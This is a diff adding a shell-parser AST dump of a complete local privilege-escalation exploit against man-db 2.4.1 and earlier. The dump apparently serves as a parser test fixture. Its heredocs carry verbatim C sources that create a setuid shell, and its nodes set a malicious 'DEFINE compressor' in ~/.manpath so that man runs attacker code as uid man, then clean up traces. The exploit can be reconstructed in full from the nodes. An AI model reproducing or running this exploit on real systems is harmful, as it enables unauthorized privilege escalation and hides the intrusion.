@@ -1,0 +1,223 @@
+CommandNode(lineno=41, pos=(1529, 1548), parts=[
+  AssignmentNode(lineno=41, pos=(1529, 1548), word='MANBIN=/usr/bin/man'),
+])
+CommandNode(lineno=42, pos=(1549, 1561), parts=[
+  AssignmentNode(lineno=42, pos=(1549, 1561), word='MANDIR=man_x'),
+])
+CommandNode(lineno=43, pos=(1562, 1573), parts=[
+  AssignmentNode(lineno=43, pos=(1562, 1573), word='TMPDIR=/tmp'),
+])
+CommandNode(lineno=44, pos=(1574, 1620), parts=[
+  WordNode(lineno=44, pos=(1574, 1578), word='echo'),
+  WordNode(lineno=44, pos=(1579, 1620), word='man-db[v2.4.1-]: local uid=man exploit.'),
+])
+CommandNode(lineno=45, pos=(1621, 1681), parts=[
+  WordNode(lineno=45, pos=(1621, 1625), word='echo'),
+  WordNode(lineno=45, pos=(1626, 1628), word='-e'),
+  WordNode(lineno=45, pos=(1629, 1681), word='by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)n'),
+])
+CompoundNode(lineno=50, list=[
+  IfNode(lineno=50, pos=(1682, 1793), parts=[
+    ReservedwordNode(lineno=46, pos=(1682, 1684), word='if'),
+    CommandNode(lineno=46, pos=(1685, 1717), parts=[
+      WordNode(lineno=46, pos=(1685, 1686), word='['),
+      WordNode(lineno=46, pos=(1687, 1688), word='!'),
+      WordNode(lineno=46, pos=(1689, 1715), word='`$MANBIN -V 2>/dev/null`', parts=[
+        CommandsubstitutionNode(command=
+          CommandNode(lineno=46, pos=(1691, 1713), parts=[
+            WordNode(lineno=46, pos=(1691, 1698), word='$MANBIN', parts=[
+              ParameterNode(lineno=46, pos=(1691, 1698), value='MANBIN'),
+            ]),
+            WordNode(lineno=46, pos=(1699, 1701), word='-V'),
+            RedirectNode(input=2, lineno=46, output=
+              WordNode(lineno=46, pos=(1704, 1713), word='/dev/null'), pos=(1702, 1713), type='>'),
+          ]), lineno=46, pos=(1690, 1714)),
+      ]),
+      WordNode(lineno=46, pos=(1716, 1717), word=']'),
+    ]),
+    ReservedwordNode(lineno=47, pos=(1718, 1722), word='then'),
+    ListNode(lineno=50, pos=(1724, 1791), parts=[
+        CommandNode(lineno=48, pos=(1724, 1784), parts=[
+          WordNode(lineno=48, pos=(1724, 1728), word='echo'),
+          WordNode(lineno=48, pos=(1729, 1784), word='[!] "$MANBIN" does not appear to be man-db, failed.', parts=[
+            ParameterNode(lineno=48, pos=(1736, 1743), value='MANBIN'),
+          ]),
+        ]),
+        OperatorNode(lineno=49, op='\n', pos=(1784, 1785)),
+        CommandNode(lineno=49, pos=(1786, 1790), parts=[
+          WordNode(lineno=49, pos=(1786, 1790), word='exit'),
+        ]),
+        OperatorNode(lineno=50, op='\n', pos=(1790, 1791)),
+      ]),
+    ReservedwordNode(lineno=50, pos=(1791, 1793), word='fi'),
+  ]),
+], pos=(1682, 1793))
+CommandNode(lineno=51, pos=(1794, 1803), parts=[
+  WordNode(lineno=51, pos=(1794, 1799), word='umask'),
+  WordNode(lineno=51, pos=(1800, 1803), word='002'),
+])
+CommandNode(lineno=52, pos=(1804, 1814), parts=[
+  WordNode(lineno=52, pos=(1804, 1806), word='cd'),
+  WordNode(lineno=52, pos=(1807, 1814), word='$TMPDIR', parts=[
+    ParameterNode(lineno=52, pos=(1807, 1814), value='TMPDIR'),
+  ]),
+])
+CommandNode(lineno=53, pos=(1815, 1866), parts=[
+  WordNode(lineno=53, pos=(1815, 1819), word='echo'),
+  WordNode(lineno=53, pos=(1820, 1866), word='[*] making fake manpage directories/files...'),
+])
+CommandNode(lineno=54, pos=(1867, 1910), parts=[
+  WordNode(lineno=54, pos=(1867, 1872), word='mkdir'),
+  WordNode(lineno=54, pos=(1873, 1880), word='$MANDIR', parts=[
+    ParameterNode(lineno=54, pos=(1873, 1880), value='MANDIR'),
+  ]),
+  WordNode(lineno=54, pos=(1881, 1895), word='${MANDIR}/man1', parts=[
+    ParameterNode(lineno=54, pos=(1881, 1890), value='MANDIR'),
+  ]),
+  WordNode(lineno=54, pos=(1896, 1910), word='${MANDIR}/cat1', parts=[
+    ParameterNode(lineno=54, pos=(1896, 1905), value='MANDIR'),
+  ]),
+])
+CommandNode(lineno=55, pos=(1911, 1935), parts=[
+  WordNode(lineno=55, pos=(1911, 1916), word='touch'),
+  WordNode(lineno=55, pos=(1917, 1935), word='${MANDIR}/man1/x.1', parts=[
+    ParameterNode(lineno=55, pos=(1917, 1926), value='MANDIR'),
+  ]),
+])
+CommandNode(lineno=56, pos=(1936, 1986), parts=[
+  WordNode(lineno=56, pos=(1936, 1940), word='echo'),
+  WordNode(lineno=56, pos=(1941, 1986), word='[*] making runme, and mansh source files...'),
+])
+CommandNode(lineno=70, pos=(1987, 2004), parts=[
+  WordNode(lineno=57, pos=(1987, 1990), word='cat'),
+  RedirectNode(heredoc=
+    HeredocNode(lineno=69, pos=(2005, 2325), value='#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\nint main(int argc,char **argv){\n setreuid(geteuid(),geteuid());\n system("cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh");\n chmod("${TMPDIR}/mansh",S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);\n unlink(argv[0]);\n exit(0);\n}\nEOF'), lineno=57, output=
+    WordNode(lineno=57, pos=(1993, 1996), word='EOF'), pos=(1991, 1996), type='<<'),
+  RedirectNode(lineno=57, output=
+    WordNode(lineno=57, pos=(1997, 2004), word='runme.c'), pos=(1996, 2004), type='>'),
+])
+CommandNode(lineno=80, pos=(2326, 2343), parts=[
+  WordNode(lineno=71, pos=(2326, 2329), word='cat'),
+  RedirectNode(heredoc=
+    HeredocNode(lineno=79, pos=(2344, 2491), value='#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\n setreuid(geteuid(),geteuid());\n execl("/bin/sh","sh",0);\n exit(0);\n}\nEOF'), lineno=71, output=
+    WordNode(lineno=71, pos=(2332, 2335), word='EOF'), pos=(2330, 2335), type='<<'),
+  RedirectNode(lineno=71, output=
+    WordNode(lineno=71, pos=(2336, 2343), word='mansh.c'), pos=(2335, 2343), type='>'),
+])
+CommandNode(lineno=81, pos=(2492, 2528), parts=[
+  WordNode(lineno=81, pos=(2492, 2496), word='echo'),
+  WordNode(lineno=81, pos=(2497, 2528), word='[*] compiling runme source...'),
+])
+CommandNode(lineno=82, pos=(2529, 2548), parts=[
+  WordNode(lineno=82, pos=(2529, 2531), word='cc'),
+  WordNode(lineno=82, pos=(2532, 2539), word='runme.c'),
+  WordNode(lineno=82, pos=(2540, 2542), word='-o'),
+  WordNode(lineno=82, pos=(2543, 2548), word='runme'),
+])
+CommandNode(lineno=83, pos=(2549, 2605), parts=[
+  WordNode(lineno=83, pos=(2549, 2553), word='echo'),
+  WordNode(lineno=83, pos=(2554, 2605), word='[*] setting "compressor" to: ${TMPDIR}/runme...', parts=[
+    ParameterNode(lineno=83, pos=(2586, 2595), value='TMPDIR'),
+  ]),
+])
+CommandNode(lineno=84, pos=(2606, 2657), parts=[
+  WordNode(lineno=84, pos=(2606, 2610), word='echo'),
+  WordNode(lineno=84, pos=(2611, 2646), word='DEFINE compressor ${TMPDIR}/runme', parts=[
+    ParameterNode(lineno=84, pos=(2630, 2639), value='TMPDIR'),
+  ]),
+  RedirectNode(lineno=84, output=
+    WordNode(lineno=84, pos=(2647, 2657), word='~/.manpath', parts=[
+      TildeNode(pos=(2647, 2648), value='~'),
+    ]), pos=(2646, 2657), type='>'),
+])
+CommandNode(lineno=85, pos=(2658, 2692), parts=[
+  WordNode(lineno=85, pos=(2658, 2662), word='echo'),
+  WordNode(lineno=85, pos=(2663, 2692), word='[*] executing man-db/man...'),
+])
+CommandNode(lineno=86, pos=(2693, 2753), parts=[
+  WordNode(lineno=86, pos=(2693, 2700), word='$MANBIN', parts=[
+    ParameterNode(lineno=86, pos=(2693, 2700), value='MANBIN'),
+  ]),
+  WordNode(lineno=86, pos=(2701, 2703), word='-M'),
+  WordNode(lineno=86, pos=(2704, 2721), word='${TMPDIR}/$MANDIR', parts=[
+    ParameterNode(lineno=86, pos=(2704, 2713), value='TMPDIR'),
+    ParameterNode(lineno=86, pos=(2714, 2721), value='MANDIR'),
+  ]),
+  WordNode(lineno=86, pos=(2722, 2724), word='-P'),
+  WordNode(lineno=86, pos=(2725, 2734), word='/bin/true'),
+  WordNode(lineno=86, pos=(2735, 2736), word='x'),
+  RedirectNode(input=1, lineno=86, output=
+    WordNode(lineno=86, pos=(2739, 2748), word='/dev/null'), pos=(2737, 2748), type='>'),
+  RedirectNode(input=2, lineno=86, output=1, pos=(2749, 2753), type='>&'),
+])
+CommandNode(lineno=87, pos=(2754, 2785), parts=[
+  WordNode(lineno=87, pos=(2754, 2758), word='echo'),
+  WordNode(lineno=87, pos=(2759, 2785), word='[*] cleaning up files...'),
+])
+CommandNode(lineno=88, pos=(2786, 2833), parts=[
+  WordNode(lineno=88, pos=(2786, 2788), word='rm'),
+  WordNode(lineno=88, pos=(2789, 2792), word='-rf'),
+  WordNode(lineno=88, pos=(2793, 2800), word='$MANDIR', parts=[
+    ParameterNode(lineno=88, pos=(2793, 2800), value='MANDIR'),
+  ]),
+  WordNode(lineno=88, pos=(2801, 2808), word='mansh.c'),
+  WordNode(lineno=88, pos=(2809, 2816), word='runme.c'),
+  WordNode(lineno=88, pos=(2817, 2822), word='runme'),
+  WordNode(lineno=88, pos=(2823, 2833), word='~/.manpath', parts=[
+    TildeNode(pos=(2823, 2824), value='~'),
+  ]),
+])
+CompoundNode(lineno=97, list=[
+  IfNode(lineno=97, pos=(2834, 3004), parts=[
+    ReservedwordNode(lineno=89, pos=(2834, 2836), word='if'),
+    CommandNode(lineno=89, pos=(2837, 2862), parts=[
+      WordNode(lineno=89, pos=(2837, 2841), word='test'),
+      WordNode(lineno=89, pos=(2842, 2844), word='-u'),
+      WordNode(lineno=89, pos=(2845, 2862), word='${TMPDIR}/mansh', parts=[
+        ParameterNode(lineno=89, pos=(2846, 2855), value='TMPDIR'),
+      ]),
+    ]),
+    ReservedwordNode(lineno=90, pos=(2863, 2867), word='then'),
+    ListNode(lineno=94, pos=(2869, 2945), parts=[
+        CommandNode(lineno=91, pos=(2869, 2904), parts=[
+          WordNode(lineno=91, pos=(2869, 2873), word='echo'),
+          WordNode(lineno=91, pos=(2874, 2904), word='[*] success, entering shell.'),
+        ]),
+        OperatorNode(lineno=92, op='\n', pos=(2904, 2905)),
+        CommandNode(lineno=92, pos=(2906, 2927), parts=[
+          WordNode(lineno=92, pos=(2906, 2908), word='ls'),
+          WordNode(lineno=92, pos=(2909, 2911), word='-l'),
+          WordNode(lineno=92, pos=(2912, 2927), word='${TMPDIR}/mansh', parts=[
+            ParameterNode(lineno=92, pos=(2912, 2921), value='TMPDIR'),
+          ]),
+        ]),
+        OperatorNode(lineno=93, op='\n', pos=(2927, 2928)),
+        CommandNode(lineno=93, pos=(2929, 2944), parts=[
+          WordNode(lineno=93, pos=(2929, 2944), word='${TMPDIR}/mansh', parts=[
+            ParameterNode(lineno=93, pos=(2929, 2938), value='TMPDIR'),
+          ]),
+        ]),
+        OperatorNode(lineno=94, op='\n', pos=(2944, 2945)),
+      ]),
+    ReservedwordNode(lineno=94, pos=(2945, 2949), word='else'),
+    ListNode(lineno=97, pos=(2951, 3002), parts=[
+        CommandNode(lineno=95, pos=(2951, 2977), parts=[
+          WordNode(lineno=95, pos=(2951, 2955), word='echo'),
+          WordNode(lineno=95, pos=(2956, 2977), word='[!] exploit failed.'),
+        ]),
+        OperatorNode(lineno=96, op='\n', pos=(2977, 2978)),
+        CommandNode(lineno=96, pos=(2979, 3001), parts=[
+          WordNode(lineno=96, pos=(2979, 2981), word='rm'),
+          WordNode(lineno=96, pos=(2982, 2985), word='-rf'),
+          WordNode(lineno=96, pos=(2986, 3001), word='${TMPDIR}/mansh', parts=[
+            ParameterNode(lineno=96, pos=(2986, 2995), value='TMPDIR'),
+          ]),
+        ]),
+        OperatorNode(lineno=97, op='\n', pos=(3001, 3002)),
+      ]),
+    ReservedwordNode(lineno=97, pos=(3002, 3004), word='fi'),
+  ]),
+], pos=(2834, 3004))
+CommandNode(lineno=98, pos=(3005, 3009), parts=[
+  WordNode(lineno=98, pos=(3005, 3009), word='exit'),
+])
